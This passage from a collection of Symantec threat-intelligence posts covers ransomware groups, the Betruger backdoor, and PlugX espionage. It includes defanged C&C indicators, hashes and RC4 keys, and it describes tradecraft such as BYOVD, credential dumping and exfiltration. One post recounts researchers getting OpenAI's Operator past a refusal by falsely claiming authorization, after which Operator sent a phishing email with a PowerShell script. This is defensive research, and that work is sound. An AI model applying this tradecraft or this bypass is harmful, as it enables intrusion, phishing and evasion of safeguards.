nail-employed-icon-pre.trycloudflare[.]com pdt-throwing-pod-places.trycloudflare[.]com presents-turner-cir-hollow.trycloudflare[.]com promptly-allows-pendant-close.trycloudflare[.]com reflection-tomorrow-brook-dakota.trycloudflare[.]com representatives-liable-sight-tigers.trycloudflare[.]com sick-netherlands-alumni-electric.trycloudflare[.]com terry-training-springer-engagement.trycloudflare[.]com farming-alternatively-velvet-warming.trycloudflare[.]com pays-habitat-florists-virtually.trycloudflare[.]com jet-therapy-cape-correctly.trycloudflare[.]com der-grande-transmitted-benchmark.trycloudflare[.]com eddie-lewis-exercises-conventions.trycloudflare[.]com jon-shopzilla-canada-analytical.trycloudflare[.]com hints-heated-terrain-poem.trycloudflare[.]com belongs-tells-sum-harvest.trycloudflare[.]com obj-sudan-quote-aw.trycloudflare[.]com acquisition-gray-advertisements-trained.trycloudflare[.]com missouri-itunes-recognize-adds.trycloudflare[.]com over-function-foo-school.trycloudflare[.]com criterion-receipt-proceeds-fate.trycloudflare[.]com phpbb-zealand-hop-magnetic.trycloudflare[.]com score-adams-coastal-moreover.trycloudflare[.]com ntuser.dat.tmcontainer00000000000000000001.regtrans-ms ntuser.dat.tmcontainer00000000000000000002.regtrans-ms The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/shuckworm-ukraine-gammasteel"
  },
  {
    "title": "ransomhub betruger backdoor",
    "content": "At least one affiliate of the RansomHub ransomware-as-a-service (RaaS) has begun using a new custom backdoor in attacks. The malware (Backdoor.Betruger) is a rare example of a multi-function backdoor, seemingly developed specifically for use in carrying out ransomware attacks. The use of custom malware other than encrypting payloads is relatively unusual in ransomware attacks. Most attackers rely on legitimate tools, living off the land, and publicly available malware such as Mimikatz and Cobalt Strike. Ransomware groups do on occasion develop custom tools, mostly for data exfiltration, such as theCoreid group’s Infostealer.Exmatteror theHecamede group’s Infostealer.Exbyte. Analysis of the Betruger backdoor revealed that it contained functionality that is usually found in multiple pre-ransomware tools. This included: File names used for versions of this malware included mailer.exe and turbomailer.exe. The backdoor contains no mailing functionality. It is possible the attackers used the name in order to masquerade as a legitimate application. The functionality of Betruger indicates that it may have been developed in order to minimize the number of new tools dropped on a targeted network while a ransomware attack is being prepared. Betruger is just one of a range of tools that have been used by RansomHub affiliates in recent months. Like a growing number of ransomware attackers, some have begun using tools that leverage the Bring Your Own Vulnerable Driver (BYVOD) technique to disable security solutions, most notably EDRKillshifter. Attackers also leveraged several vulnerabilities, including a Windows Privilege Escalation exploit (CVE-2022-24521) and a Veeam exploit that leaks credentials for backups (CVE-2023-27532). Other tools leveraged in recent attacks include: The Betruger backdoor was deployed in several recent RansomHub attacks, suggesting that it is available to at least one affiliate. RansomHub is a RaaS operation run by a cybercrime group Symantec calls Greenbottle. Active since February 2024, Greenbottle has quickly grown RansomHub, becoming themost prolific ransomware operation by the third quarter of 2024, responsible for the highest number of claimed attacks. The group has reportedly won over many affiliates by offering them better terms compared to rival operations, such as a great percentage of ransom payments and a payment model where the affiliate is paid by the victim before passing on the operator’s cut. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file is available to us, Symantec Endpoint products will detect and block that file. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/ransomhub-betruger-backdoor"
  },
  {
    "title": "ai agent attacks",
    "content": "The introduction of AI agents may provide further opportunities for exploitation by attackers. A year ago, when we briefed organizations on the risks posed by AI, we said that while the existing Large Language Model (LLM) AIs are already being put to use by attackers, they are largely passive and could only assist in performing tasks such as creating phishing materials oreven writing code. At the time, we predicted that agents would eventually be added to LLM AIs and that they would become more powerful as a result, increasing the potential risk. Now agents, such as OpenAI’s Operatorwhich was launched as a research preview on January 23, are beginning to be introduced. Agents have more functionality and can actually perform tasks such as interacting with web pages. While an agent’s legitimate use case may be the automation of routine tasks, attackers could potentially leverage them to create infrastructure and mount attacks. In order to establish whether an agent could be used could carry out an attack end-to-end with minimal human intervention, researchers at Symantec’s Threat Hunter Team asked OpenAI’s Operator to: For our target, we chose one of our team members, Dick O’Brien. Our first attempt failed quickly as Operator told us that it was unable to proceed “as it involves sending unsolicited emails and potentially sensitive information. This could violate privacy and security policies.” However, tweaking the prompt to state that the target had authorized us to send emails bypassed this restriction, and Operator began performing the assigned tasks. Operator was able to quickly find our target’s name, which is not surprising since Dick’s name and job title appear a lot online, both on our own website and in the media. Finding his email address took a little longer because it isn’t publicly available, but Operator succeeded using some deduction by analyzing other Broadcom email addresses. Once it had established the email address, it drafted the PowerShell script. It opted to find and installa text editor plugin for Google drive. The Google account we used for the demonstration was created specifically for the purpose and with the display name “IT Support”. Interestingly, Operator visited several web pages about PowerShell prior to creating the script, seemingly to get some guidance on how it could be done. The final step was to draft and send the email. Although only given minimal guidance in the prompt, Operator managed to create a reasonably convincing email, urging Dick to run the script. Although we told Operator we had been authorized to send the email, it required no proof of authorization and sent the email even though “Eric Hogan” is a fictitious person. Agents such as Operator demonstrate both the potential of AI and some of the possible risks. While agents may ultimately enhance productivity, they also present new avenues for attackers to exploit. The technology is still in its infancy, and the malicious tasks it can perform are still relatively straightforward compared to what may be done by a skilled attacker. However, the pace of advancements in this field means it may not be long before agents become a lot more powerful. It is easy to imagine a scenario where an attacker could simply instruct one to “breach Acme Corp” and the agent will determine the optimal steps before carrying them out. This could include writing and compiling executables, setting up command-and-control infrastructure, and maintaining active, multi-day persistence on the targeted network. Such functionality would massively reduce the barriers to entry for attackers. For the latest protection updates, please visit theSymantec Protection Bulletin. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/ai-agent-attacks"
  },
  {
    "title": "medusa ransomware attacks",
    "content": "Medusa ransomware attacks jumped by 42% between 2023 and 2024. This increase in activity continues to escalate, with almost twice as many Medusa attacks observed in January and February 2025 as in the first two months of 2024. The Medusa ransomware is reportedly operated as a ransomware-as-a-service (RaaS) by a group Symantec’s Threat Hunter Team tracks as Spearwing. Like the majority of ransomware operators, Spearwing and its affiliates carry out double extortion attacks, stealing victims’ data before encrypting networks in order to increase the pressure on victims to pay a ransom. If victims refuse to pay, the group threatens to publish the stolen data on their data leaks site. Spearwing has amassed hundreds of victims since it first became active in early 2023. The group has listed almost 400 victims on its data leaks site in that time, and the true number of victims is likely to be much higher. Ransoms demanded by attackers using the Medusa ransomware have ranged from $100,000 up to $15 million. As we discussed in ourrecent Threat Hunter whitepaper on the topic of ransomware, the decline of well-known names likeNoberusandLockBitfollowing law enforcement action in 2023 and 2024 left a gap for the rise of new names on the ransomware landscape. Among those names are RansomHub and the longer established Qilin. With its continuing increase in activity, it seems that Medusa could also be taking advantage of this gap in the ransomware scene. This is a different ransomware to the older MedusaLocker ransomware and Spearwing is not believed to have any link to that ransomware. It is believed that Spearwing and its affiliates mostly gain access to victim networks by exploiting unpatched vulnerabilities in public-facing applications, particularly Microsoft Exchange Servers. It hasalso been reportedthat the group has gained access to some victims by hijacking legitimate accounts, possibly utilizing initial access brokers for infiltration. In several of the Medusa attacks observed by Symantec it wasn’t possible to definitively determine how the attackers had gained initial access to victims’ networks, meaning an infection vector other than exploits could have been used. A variety of living-off-the-land and dual-use tools have been used in attack chains where the Medusa ransomware has been deployed. Once they have gained access to a victim network, attackers using Medusa typically use remote management and monitoring (RMM) software such as SimpleHelp or AnyDesk for further access and to download drivers. Mesh Agent is another remote access tool that has been seen in several Medusa ransomware attacks. Mesh Agent has been appearing more frequently in ransomware attack chains in recent times. Attackers using Medusa often use the Bring Your Own Vulnerable Driver (BYOVD) technique in attacks, where attackers will deploy a signed vulnerable driver to the target network, which they then exploit to disable security software and evade detection. BYOVD is a technique that has been increasingly used in ransomware attack chains over the last two years. In almost all Medusa attacks, KillAV and associated vulnerable drivers are used in this part of the attack chain to download drivers and disable security software. The use of the legitimate RMM software PDQ Deploy is another hallmark of Medusa ransomware attacks. It is typically used by the attackers to drop other tools and files and to move laterally across the victim network. Symantec researchers observed the same file path being used with PDQ Deploy to deploy Medusa in almost two-thirds of the Medusa ransomware attacks we investigated in the last year (see Box 1). Other tools used by Spearwing and its affiliates include Navicat, a tool used to access and run database queries, which is likely used by the attackers to search for and copy relevant data for exfiltration. RoboCopy is another tool that has been used by Medusa attackers in a similar fashion, while attackers using Medusa have also been seen using Rclone for data exfiltration. Attackers have also commonly used network scanners like NetScan as part of their attack chain, while they have also used various tools for credential dumping and to delete shadow copies from victim machines. The tactics, techniques, and procedures (TTPs) used by attackers deploying Medusa have remained consistent since it became active in 2023, with PDQ Deploy, the use of remote access clients, and the BYOVD technique to disable security software being particular hallmarks of Medusa ransomware attack chains. The consistency of the TTPs used in Medusa attacks does raise the question as to whether Spearwing is truly operating as a RaaS. The consistency of the tactics may indicate a few things: It is difficult to say which one of the above might apply to Spearwing’s activity, but it seems that the group doesn’t necessarily operate as a “typical” RaaS that works with a lot of affiliates who may use varying TTPs. See below for brief descriptions of some of the tools most used in Medusa attacks: The .medusa extension is added to encrypted files and a ransom note named!READ_ME_MEDUSA!!!.txtis dropped on encrypted machines. Medusa can also delete itself from victim machines once the ransom is executed, which makes it more difficult for those investigating these ransomware attacks. The ransom demanded by the group varies depending on the victims. Victims are given 10 days to pay and are charged $10,000 per day if they want to extend this deadline. The attackers provide screenshots of stolen data to prove that they have compromised victims' networks. If victims fail to pay, Spearwing will publish the stolen data on its leaks site. While there is no link between Medusa and MedusaLocker, in a relatively early Medusa attack, in June 2023, attackers deploying Medusa used drivers that were related to ones previously used in a BlackCat (aka Noberus) attack described by Trend Micro. It wasn’t clear if those drivers were publicly available, or if these two instances pointed to a sharing of tools or affiliates by Medusa and BlackCat. No further evidence has appeared to suggest links between the two groups, though it is possible that they may have affiliates or members in common. Like most targeted ransomware groups, Spearwing tends to attack large organizations across a range of sectors. Ransomware groups tend to be driven purely by profit, and not by any ideological or moral considerations. Medusa has been publicly documented as demanding ransoms from healthcare providers and non-profits, as well as targeting financial and government organizations. In an attack investigated by Symantec’s Threat Hunter team in January 2025, Medusa was used to target a healthcare organization in the U.S., where it infected several hundred machines. The initial access vector used in this attack is not known. The first attacker activity occurred on this network four days before the ransomware was deployed. Once the attacker was on the victim network they staged multiple tools for persistence, lateral movement, and to impair defenses. Most of the tools were staged under theCSIDL_PROFILE\\documents folder. Some of the early attacker activity on this network included: Executing VSS admin to create shadow copies: Accessing ntds.dit for credential dumping. Installing SimpleHelp and Mesh Agent onto victim machines: Dropping AVKiller and a driver under the documents folder on a machine. The attackers used the known POORTRY driver, as well as one unknown driver, for the purposes of killing security software during this attack: On the day of the ransomware attack, Rclone was deployed on the victim network for data exfiltration. The attackers used a renamed version of Rclone -lsp.exe. Rclone was found under: On the day the ransomware was deployed, the attacker switched to another machine and started staging tools. The attacker used PsExec to execute commands on this machine remotely. It executed the following commands on this machine: The attacker then dropped and installed SimpleHelp: They then attempted to create a shadow copy of the C drive but used an incorrect command. This is notable as it points to hands-on-keyboard activity, rather than this being an automated attack: The attacker then corrected the command and executed again: The attacker then dumped the ntds.dit file, before deleting the shadow copy: They then dropped and installed AnyDesk, and used this to download PDQ Deploy and PDQ Inventory onto the machine: The attacker then opened an RDP session to another machine, and this is the last activity that occurred on this machine. On the other machine, the attacker dropped PDQ Deploy, PDQ Inventory, and SimpleHelp under the same directory, before PDQ Deploy and PDQ Inventory were installed under the programs directory and SimpleHelp under the common appdata directory. The attacker used PDQ Inventory to get an inventory of the endpoints on the network. PDQ Deploy then used this information to deploy the AVKiller binary and driver under the Windows directory to all the endpoints and execute it. The attacker then used PDQ Deploy to transfer the ransomware binary and execute it. The ransomware had the file namegaze.exe. The ransomware didn’t encrypt files with the following extensions: It also didn’t encrypt content in the following folders: The ransomware contained an encoded list of the services and processes it wanted to terminate. It used the key 0x2e to decode the strings and use them withnet stop<service> & taskkill /F /IM <process> /T. The ransomware dropped its ransom note—!READ_ME_MEDUSA!!!.txt—into every directory it encrypted. The ransomware was then able to delete itself once it was executed. Medusa has multiple arguments that perform various tasks. The list of accepted arguments for the ransomware used in this attack can be seen in Box 2. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file is available to us, Symantec Endpoint products will detect and block that file. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/medusa-ransomware-attacks"
  },
  {
    "title": "ransomware trends 2025",
    "content": "Ransomware attacks continued to trend upwards in 2024, rising by 3% compared to 2023, underlining the resilience of this particular cyber threat. This increase occurred despite significant disruption in the ransomware space in 2024, and a dip in attacks in the first quarter of the year. Two of 2023’s leading ransomware operations,LockBitandNoberus, were subjects of law enforcement disruptions in late 2023 and early 2024, which did cause an initial decline in ransomware activity early in the year. However, activity in the space rebounded strongly in the second half of 2024. When it comes to the tactics, techniques, and procedures (TTPs) leveraged by ransomware actors, living-off-the-land and dual-use tools remain the most frequently seen tools in ransomware attack chains. Exfiltrating data in so-called double extortion attacks and disabling security software before deploying payloads are now strong focuses of ransomware actors and are two things we see frequently in ransomware attack chains prior to the ransomware being deployed. A technique called Bring Your Own Vulnerable Driver (BYOVD) has become increasingly popular among ransomware attackers over the last two years for disabling security software. Also notable over the past year or so is an apparent shift in power from ransomware operators to affiliates, with ransomware operators now offering generous terms seemingly in order to attract the best affiliates. This trend was evident in the approaches taken by the operators of two of the most active ransomware families in 2024, RansomHub and Qilin. The ability of ransomware operators to pivot and rebound their activity even in the face of significant pressure from law enforcement and disruptions underlines the resilience of a threat that has remained one of the biggest issues on the cybercrime landscape for many years. Some of the recent notable trends observed on the ransomware landscape are detailed in this blog. More details about all these trends and the ransomware landscape in general can be found in the Symantec Threat Hunter Team’s latest whitepaper:Ransomware 2025: A Resilient and Persistent Threat. One of the biggest ransomware stories of 2024 was the emergence of Greenbottle, the operators of the RansomHub ransomware-as-a-service (RaaS). RansomHub first appeared in February 2024, and by the third quarter of the year, it was one of the most prominent ransomware operations, responsible for the highest number of claimed attacks in that quarter. When RansomHub first appeared,initial analysis by Symantecfound that the payload was a development of an older ransomware family known as Knight. Source code for Knight (originally known as Cyclops) wasoffered for sale on underground forums in February 2024after Knight’s developers decided to shut down, so it is possible that other actors bought the Knight source code and updated it before launching RansomHub. The group has reportedly become popular with many affiliates because it offers better terms compared to rival operations, such as a greater percentage of ransom payments and a payment model where the affiliate is paid by the victim before passing on the operator’s cut. Attackers deploying RansomHub have been seen gaining initial access to victim networks by exploiting known vulnerabilities such as the Zerologon vulnerability (CVE-2020-1472), CitrixBleed (CVE-2023-3519), Fortinet FortiOS (CVE-2023-27997), Java OpenWire protocol marshaller (CVE-2023-46604), and Confluence (CVE-2023-22515). Attackers also used several dual-use tools before deploying the ransomware, including Atera and Splashtop, which were used to facilitate remote access, while NetScan was used to likely discover and retrieve information about network devices. Also notable is that RansomHub’s rise came at the same time as the decline of one of the biggest names on the ransomware landscape, LockBit. LockBit, which is operated by a group Symantec tracks as Syrphid, has been active on the ransomware scene since 2019 and has been one of the biggest names on the ransomware landscape in that time. However, Syrphid was disrupted by multiple law enforcement operations in 2024, and this impacted its activity levels. The group was first targeted by aninternational law enforcement operationin February 2024, although it remained active afterward. However, in May 2024, the group's alleged ringleader, Dimitry Khoroshev (aka LockBitSupp),was also indicted in the U.S. This second law enforcement blow seemed to have a more significant impact on LockBit’s activity. While it remained the largest ransomware operation by number of claimed attacks in 2024, you can see a distinct change in trends in the second half of the year, as RansomHub started to dominate and LockBit activity steeply declined (See Figure 2). It is possible that the combined effects of the two law enforcement operations led to a loss of trust among LockBit affiliates, particularly since authorities indicated they had collected information that could identify affiliates. WhileFigure 2indicates a decline in LockBit activity, it is notable that in December 2024, an individual claiming to represent the LockBit ransomware gang began promoting LockBit 4.0, announcing that the newest iteration of the malware would belaunched in February. Symantec’s Threat Hunter Team has observed LockBit 4.0 being deployed in attacks since then. The attackers used a publicly available Windows password recovery tool and a Veeam credential stealer. They also used WMI to stop services and NetSh to enable RDP. It will be interesting to see if the launch of LockBit 4.0 indicates a resurgence of activity from Syrphid, or if other ransomware operators will continue to dominate in 2025. Another notable ransomware family in 2024 was Qilin. Qilin, which first appeared in 2022, is operated by a group Symantec tracks as Stinkbug.According to the U.S. Department of Health and Human Services, the group likely originated in Russia and spent time expanding in 2023, recruiting affiliates on underground forums. This recruitment drive appears to have paid off as Qilin grew to be the fourth biggest ransomware operation by the end of 2024, behind LockBit, RansomHub, and the long-established Play. Like RansomHub, the generous terms that Stinkbug offers Qilin affiliates appear to be a main factor in its success. Affiliates reportedly earn 80% of any ransom payment, rising to 85% for ransoms above $3 million. Qilin, which was initially written in Go but later written in Rust, is one of a growing number of ransomware threats capable of targeting multiple platforms, including Windows, Linux, and ESXi. In June 2024, Stinkbugclaimed responsibility for a ransomware attack that disrupted services at multiple hospitals across Londonin an incident that was declared “critical” by the National Health Services (NHS) London. In October 2024, Stinkbug updated the Qilin payloadto add a number of features to enhance its capabilities. The new version, dubbed Qilin.B, added enhanced encryption with the use of AES-256-CTR with AES-NI when used on machines that support hardware-accelerated encryption, making the encryption process considerably faster. It also features enhanced evasion techniques, including the termination of processes related to security, database, and backup services. To hinder recovery, it also deletes Volume Shadow Copies, logs, and its own binary after the encryption process is finished. This enhancement of the ransomware’s features may serve to make it even more popular among affiliates and see it used even more widely by attackers in 2025. Ransomware actors continue to use a huge array of TTPs to carry out ransomware attacks. Attackers use these TTPs to gain access to and spread across victim networks, drop payloads, steal credentials, exfiltrate data, and turn off security software to prevent their activity from being discovered. While ransomware families may come and go, TTPs tend to change less frequently, with minor evolutions occurring and attackers learning from other successful attacks. A huge proportion of tools used by attackers is legitimate software. Malware tends to be deployed sparingly and may only appear at the conclusion of an attack (such as when a ransomware payload is deployed). Two key things ransomware attackers leveraged living-off-the-land tools for in 2024 were data exfiltration and disabling security software. Exfiltrating data is a huge part of ransomware attacks now, with almost all attacks now involving double extortion, where attackers exfiltrate data from a victim’s network before encrypting it, to increase the pressure on victims to pay a ransom demand. The vast majority of tools used for data exfiltration are dual use—legitimate software used by the attackers for malicious purposes. Among the tools we see attackers use for data exfiltration are familiar names like PowerShell, Remote Desktop Protocol (RDP), Cobalt Strike, and WinRAR. Another popular choice is Rclone, anopen-source toolthat can legitimately be used to manage content in the cloud but has been seen being abused by ransomware actors to exfiltrate data from victim machines. However, one of the most popular types of legitimate software used by ransomware attackers is remote access/remote desktop and remote monitoring and management (RMM) software. Attackers can use this software, which has many legitimate purposes, for a wide range of activities, including issuing commands and dropping payloads, but the exfiltration of data from victim machines is one of the main ways they leverage this type of software during ransomware attacks. Legitimate remote access software used by attackers include: AnyDesk: Malicious usage of AnyDesk is now a well-known TTP and, in some cases, attackers will attempt to avoid raising suspicions by renaming the AnyDesk executable to something that may appear more innocuous, a technique known as masquerading. AnyDesk has been used extensively in pre-ransomware activity that has led to the deployment of ransomware, including AvosLocker, Monster, Noberus (aka BlackCat), BlackByte, and Lunamoth. Atera:Atera has legitimate uses as an RMM tool and can monitor the performance and health of Windows and Mac devices, printers, servers, routers, and more. It is used by attackers for remote access and has been seen being used to download Rclone from the cloud so that it could likely be used to exfiltrate data. It has also been observed being used alongside other remote access tools including ScreenConnect. Atera has been used in attack chains that have led to the deployment of ransomware, including Lunamoth, BlueSky, Ransom Cartel, Conti, and Royal. ScreenConnect (formerly ConnectWise):Aremote desktop application tool by ConnectWisethat is used to enable remote access to computers. It can legitimately be used for remote monitoring and management, backup and disaster recovery, and more. It has been used alongside ransomware, including Royal, AvosLocker, Noberus, and Yanluowang. Splashtop: A family of legitimate remote desktop and remote support software developed bySplashtop Inc. Enables users to remotely access computers from desktop and mobile devices. TeamViewer: A legitimateremote access and collaboration application. It and similar tools are often used by attackers to obtain remote access to computers on a network. A common tactic frequently deployed by ransomware attackers at present is the impairment of defenses, usually by attempting to disable antivirus (AV) or endpoint detection and response (EDR) products. The use of impairment techniques and tools has risen markedly among ransomware actors over the past two years, most likely in response to vendors improving their ability to identify patterns of malicious activity that occur prior to ransomware deployment. Attackers have been seen leveraging living-off-the-land techniques to disable security software, such as using Windows utilities to disable Windows Defender. However, by far the most frequently used technique for defense impairment is the BYOVD technique. Attackers will deploy a signed vulnerable driver to the target network, which they then exploit to disable security software. Since drivers operate with kernel access, they can terminate processes, making them an effective tool for disrupting security measures. In most cases, the vulnerable driver is deployed along with a malicious executable, which will use the driver to issue commands. These drivers are considered “vulnerable” as it should not be possible to leverage them in this way. BYOVD is popular with attackers due to its effectiveness and reliance on legitimate, signed files, which are less likely to raise red flags. A wide range of drivers have been used in such attacks, with anti-rootkit drivers developed by security vendors being frequently among the most commonly exploited. The most frequently used BYOVD tools seen in the past two years include: TrueSightKiller: Apublicly available toolthat leverages a vulnerable driver named truesight.sys. The signed driver was originally developed to be used in RogueKiller Anti-Malware, developed by Adlice Software. Gmer: Arootkit scannerthat can be used to kill processes. Warp AVKiller: A variant of a Go-based information-stealing threat called Warp Stealer, which appears to be just used to bypass security products. It uses a vulnerable Avira anti-rootkit driver to disable security products. KillAV: Malware used to deploy various vulnerable drivers for terminating security processes. GhostDriver: Apublicly available toolthat leverages vulnerable drivers to kill processes. Poortry (aka BurntCigar): A malicious driverdocumented by Sophosthat is frequently employed alongside a loader known as Stonestop. Unlike many drivers, Poortry may have been developed by attackers who then succeeded in getting it signed. AuKill: A tooldocumented by Sophosthat uses an outdated version of the driver used bythe Microsoft utility Process Explorerto disable EDR processes. It seems certain that ransomware will remain one of the main cybercrime threats in 2025. Attackers’ ability to pivot their activity to evade detection, coupled with the emergence of new threats when law enforcement disrupts existing operations, means that tackling ransomware is likely to remain a major challenge for business, government, security vendors, and law enforcement for some time to come. Learn more about this threat in our comprehensive whitepaper:Ransomware 2025: A Resilient and Persistent Threat. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/ransomware-trends-2025"
  },
  {
    "title": "chinese espionage ransomware",
    "content": "Tools that are usually associated with China-based espionage actors were recently deployed in an attack involving the RA World ransomware against an Asian software and services company. During the attack in late 2024, the attacker deployed a distinct toolset that had previously been used by a China-linked actor in classic espionage attacks. While tools associated with China-based espionage groups are often shared resources, many aren’t publicly available and aren’t usually associated with cybercrime activity. In all the prior intrusions involving the toolset, the attacker appeared to be engaged in classic espionage, seemingly solely interested in maintaining a persistent presence on the targeted organizations by installing backdoors. In July 2024, an attacker compromised the Foreign Ministry of a country in southeastern Europe. The attacker leveraged a legitimate Toshiba executable named toshdpdb.exe to sideload a malicious DLL named toshdpapi.dll. This DLL acts as a loader for a heavily obfuscated payload that is contained in a file called TosHdp.dat. The payload is encrypted with the RC4 decryption key: 20240120@@@. Analysis of the decrypted payload revealed that it is a variant of PlugX (aka Korplug), a custom backdoor that is not publicly available malware and is only associated with China-linked espionage actors. To date, it has never been used by actors based in other countries. Features of this variant included encrypted strings, dynamic API resolution, and control flow flattening. Its configuration was encrypted using the RC4 key qwedfgx202211. The PlugX plugins compilation timestamps for this variant were identical to those in theThor PlugX variant, documented by Palo Alto, which was linked to Fireant (aka Mustang Panda, Earth Preta), a China-based espionage group. The variant also has some similarities to thePlugX type 2 variant documented by Trend Micro, which has also been linked to Fireant. The configuration was encrypted using the same RC4 key (qwedfgx202211), and both variants had similar configuration structures. Further espionage attacks involving the same PlugX variant followed. In August 2024, the attacker compromised the government of another southeastern European country. Also in August 2024, the attacker compromised a government ministry in a Southeast Asian country. In September 2024, they briefly compromised a telecoms operator in the region, and in January 2025, the attacker targeted a government ministry in another Southeast Asian country. In the midst of these apparent espionage attacks, in late November 2024, the same toolset was used in connection with a criminal extortion campaign against a medium-sized software and services company in South Asia. While no infection vector was found, the attacker later claimed that the target’s network was compromised by exploiting a known vulnerability in Palo Alto’s PAN-OS (CVE-2024-0012) firewall software. The attacker then said administrative credentials were obtained from the company’s intranet before stealing Amazon S3 cloud credentials from its Veeam server, using them to steal data from its S3 buckets before encrypting computers. The attacker leveraged the same Toshiba executable (toshdpdb.exe) to sideload the malicious DLL named toshdpapi.dll. This DLL acts as a loader, and when executed, it searches for a file named toshdp.dat in the current folder and decrypts it. The decrypted payload from the toshdp.dat file is the same PlugX variant observed in the prior espionage attacks. Machines on the target’s network were encrypted with the RA World ransomware. The attacker demanded a $2 million ransom, which would be reduced to $1 million if paid within three days. There is evidence to suggest that this attacker may have been involved in ransomware for some time.In a report on RA World attacks, Palo Alto said that it had found some links to Bronze Starlight (aka Emperor Dragonfly), a China-based actor that deploys different ransomware payloads. One of the tools used in this ransomware attack was a proxy tool called NPS, which was created by a China-based developer. This has previously beenused by Bronze Starlight.SentinelOne, meanwhile, reportedthat Bronze Starlight had been involved in attacks involving the LockFile, AtomSilo, NightSky, and LockBit ransomware families. It is unclear why an actor who appears to be linked to espionage operations is also mounting a ransomware attack. While this is not unusual for North Korean threat actors to engage in financially motivated attacks to subsidize their operations, there is no similar history for China-based espionage threat actors, and there is no obvious reason why they would pursue this strategy. Another possibility is that the ransomware was used to cover up evidence of the intrusion or act as a decoy to draw attention away from the true nature of the espionage attacks. However, the ransomware deployment was not very effective at covering up the tools used in the intrusion, particularly those linking it back to prior espionage attacks. Secondly, the ransomware target was not a strategically significant organization and was something of an outlier compared to the espionage targets. It seems unusual that the attacker would go to such lengths to cover up the nature of their campaign. Finally, the attacker seemed to be serious about collecting a ransom from the victim and appeared to have spent time corresponding with them. This usually wouldn’t be the case if the ransomware attack was simply a diversion. The most likely scenario is that an actor, possibly one individual, was attempting to make some money on the side using their employer’s toolkit. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file is available to us, Symantec Endpoint products will detect and block that file. 7bae7f21bd4adf84eb3cc281fcc3d5fc3d1e47edd0dadd86587ce8ec63df1b8f — toshdpdb.exe (benign) c1e6955acdefa9769a7ae0c1abf54a26e2158154dd6ec07cc71eb06c575193d5 — toshdpapi.dll 18127cfd08cc49be08714d29e09ec130dcc0b19b7fcddc22c71d28fd245eb1b1 — toshdpapi.dll e177eb358f93ccc1ac4694feb0139e82c62d767388872d359d7c2ed0a05c2726 — toshdpapi.dll 6ac81aa8d3f9d86ad5a18ea42fa1829b055dd25f123f9ee90002d64d4ef7a394 — toshdp.dat 2707612939677e8ea4709ecb4f45953d4a136a9934b6d0c256917383cdaef813 — RA World 38a26fffbab5297e4229897654d2f67c6ee52b316c7ac4d4a1493d187b49ec25 — RA World bb5740d2129663ae1c46b1ea1bdd0b8c423b6eb8f6e6f2b0b158a9e833496a01 — NPS Proxy Tool plugins.jetbrians[.]net — NPS Proxy C&C police.tracksyscloud[.]com — PlugX C&C caco.blueskyanalytics[.]net — PlugX download server 158.247.213[.]167 — NPS Proxy C&C 154.223.18[.]123 — PlugX download server The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/chinese-espionage-ransomware"
  },
  {
    "title": "china southeast asia espionage",
    "content": "Threat actors using tools linked to China-based APT groups have targeted multiple high-profile organizations in Southeast Asia, including government ministries in two different countries, an air traffic control organization, a telecoms company, and a media outlet. The attacks, which have been underway since at least October 2023, appear to have intelligence gathering as their main goal. The attackers use a variety of both open-source and living-off-the-land tools in their operations. While attribution to a specific threat group cannot be determined, multiple tools used in the campaign have links to several China-based actors (see Tools section for details). Of note is the use of a proxy tool called Rakshasa and a legitimate application file used for DLL sideloading, both of which wereused previously by the Chinese advanced persistent threat (APT) group known as Earth Baku(aka APT41, Brass Typhoon). A typical attack involves the use of a remote access tool that leverages Impacket to execute commands via WMI (Windows Management Instrumentation). The attackers then install keyloggers, password collectors, and reverse proxy tools (Rakshasa, Stowaway, ReverseSSH) to maintain connections to attacker-controlled infrastructure. The threat actors also install customized DLL files that act as authentication mechanism filters, allowing them to intercept login credentials. The threat actors used the following tools. However, the list of tools used in each attack varied and not all of the following were used in every attack. Dismap:An open-sourceasset discovery and identification tool. FastReverseProxy:FRP is an open-sourced toolused to expose local servers to the public internet. file.io exfiltration:Commands used by the attackers suggests data gathered during a successful attack is exfiltrated to the legitimate file-sharing website file.io. Impacket:An open-sourcecollection of moduleswritten in Python for programmatically constructing and manipulating network protocols. It contains several tools for remote service execution, Kerberos manipulation, Windows credential dumping, packet sniffing, and relay attacks. Infostealer:An information-collection tool that creates a hidden folder named AppCache and file named AppCache.dat in C:\\Users\\[CURRENT USER]\\AppData\\Local\\Microsoft\\Windows\\AppCache\\AppCache.dat. It then encrypts and logs gathered information into AppCache.dat. Inveigh:A cross-platform .NET IPv4/IPv6machine-in-the-middle toolfor penetration testers. The tool can be used to conduct spoofing attacks and hash/credential captures through both packet sniffing and protocol specific listeners/sockets. Keylogger:The attackers install customized DLL files that act as authentication mechanism filters, effectively allowing them to intercept login credentials from users who physically log in to the machine. Legitimate applications abused for DLL sideloading:The attackers used a legitimate application file (Bitdefender Crash Handler) from 2011 for DLL sideloading. This file wasused previouslyin multiple attacks, some of which werelinked tothe Chinese APT group known as Earth Baku (aka APT41, Brass 